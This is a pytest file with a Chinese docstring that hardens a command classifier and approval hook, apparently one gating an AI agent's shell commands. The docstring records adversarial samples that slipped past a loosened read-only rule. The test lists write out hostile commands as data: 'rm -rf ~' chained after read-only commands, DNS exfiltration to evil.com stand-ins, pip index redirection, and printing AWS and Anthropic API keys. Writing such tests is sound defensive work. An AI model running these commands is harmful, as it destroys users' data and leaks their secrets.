"""第 16 轮值守留下的 74 条对抗样本 —— 固化进仓库，别让它只活在 /tmp 里。

这一轮放宽只读规则时出了**两次**「全量测试绿着漏」：

1. 12:30 第一批 10 条：判据写成「这一段里出现过只读选项就放行」⇒ 只读选项后面
   再挂一个写选项就全过（`screen -ls -X stuff 'rm -rf ~'`、`crontab -l -r`、
   `softwareupdate --list -i -a`、`pip config set`…）。
2. 12:57 第二批 18 条：一整批命令**整条**进了只读名单，只写了正常用法的用例
   （`scutil --set HostName`、`ifconfig en0 down`、`ping -f`、`dig @server` 外发…）。

两次都是值守角色拿对抗样本撞出来的，不是测试跑出来的 —— 当时全量测试全绿。
所以把它的样本搬进仓库：**以后任何人再放宽这道闸，这个文件会替他撞一遍。**
原始脚本存档在 `docs/iteration/r16-adversarial-samples.py.txt`。
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest

from bridge.approval import HOOK_SOURCE
from bridge.cmdclass import classify

_NS: dict = {}
exec(HOOK_SOURCE.split("if __name__ ==")[0], _NS)  # noqa: S102
_hook = _NS["_classify_readonly"]
_never = _NS["never_approvable"]

# 「只读头 + 危险尾」的串联、以及各命令族里会写的那些形状。
# 🔴 新增一族只读命令时，把它**会写的那几个子命令/选项**加到这里。
MUST_ASK = [
    # 往终端里敲字 / 杀会话
    "tmux send-keys -t 0 'rm -rf ~' Enter", "tmux kill-server", "tmux run-shell 'rm -rf ~'",
    "tmux pipe-pane -o 'cat > ~/out'", "tmux capture-pane -b mybuf",
    "screen -X stuff 'rm -rf ~\\n'", "screen -ls -X stuff 'rm -rf ~'", "screen -dmS x bash -ls",
    # 改系统 / 网络设置
    "pmset -g -a sleep 0", "pmset sleepnow", "crontab -l -r", "crontab /tmp/evil.cron -l",
    "softwareupdate --list -i -a", "networksetup -getinfo Wi-Fi -setdnsservers Wi-Fi 1.1.1.1",
    "scutil --set HostName evil", "scutil --nc start myvpn", "scutil --renew en0",
    "ifconfig en0 down", "ifconfig en0 192.168.1.9", "ifconfig lo0 alias 1.2.3.4",
    # 供应链 / 解释器
    "pip config set global.index-url http://evil", "pip3 config unset global.index-url",
    "python3 -c 'print(1)'", "node -e 'require(\"fs\")'", "env /usr/bin/touch /tmp/pwned",
    # 出网外带（curl/wget 另有 deny；这几条是绕路）
    "dig @1.2.3.4 exfil.evil.com", "host -t txt exfil.evil.com", "nslookup evil.com 1.2.3.4",
    "dig -f /tmp/list.txt",
    # 打网络 / 挂住
    "ping -f 1.1.1.1", "ping 1.1.1.1",
    # 读凭据的环境变量
    "printenv AWS_SECRET_ACCESS_KEY", "printenv ANTHROPIC_API_KEY",
    # 只读头接危险尾
    "who am i; rm -rf ~", "w && git push origin main", "tmux capture-pane -p -t 0; rm -rf ~",
    "screen -ls && rm -rf ~", "tmux list-sessions | tee ~/out",
]

# 这些是「真的只在看」—— 放宽判据时不许把它们误伤回去（阳性对照）。
MUST_BE_SILENT = [
    "tmux capture-pane -p -t 0", "tmux list-sessions", "screen -ls", "pmset -g", "pmset -g batt",
    "crontab -l", "softwareupdate --list", "networksetup -getinfo Wi-Fi", "scutil --dns",
    "scutil --get HostName", "ifconfig en0", "ifconfig -a", "ping -c 1 open.feishu.cn",
    "netstat -an | grep LISTEN", "pip list", "pip config list", "printenv", "printenv PATH",
    "who", "w", "ioreg -c IOPlatformExpertDevice", "system_profiler SPHardwareDataType",
]

NEVER = [
    "rm -rf ~", "rm -rf ~/", "rm -r -f ~", "rm -fr ~/", "rm -rf $HOME/",
    "find ~ -delete", "find $HOME -delete", "git push origin main", "sudo ls",
]


@pytest.mark.parametrize("cmd", MUST_ASK)
def test_must_ask(cmd):
    assert not classify(cmd).readonly, f"🔴 放行了会写/外带的命令：{cmd}"
    assert not _hook(cmd), f"🔴 钩子那份放行了：{cmd}"


@pytest.mark.parametrize("cmd", MUST_BE_SILENT)
def test_must_be_silent(cmd):
    assert classify(cmd).readonly, f"误伤了「看一眼」：{cmd} ← {classify(cmd).reason}"
    assert _hook(cmd), f"钩子那份误伤了：{cmd}"


@pytest.mark.parametrize("cmd", NEVER)
def test_never_approvable(cmd):
    """🔴 这些点「同意」也不许做 —— 收窄 `policy.ALWAYS_DENY` 之后它们只剩这一道。"""
    assert _never(cmd), f"连点同意都不该放行：{cmd}"
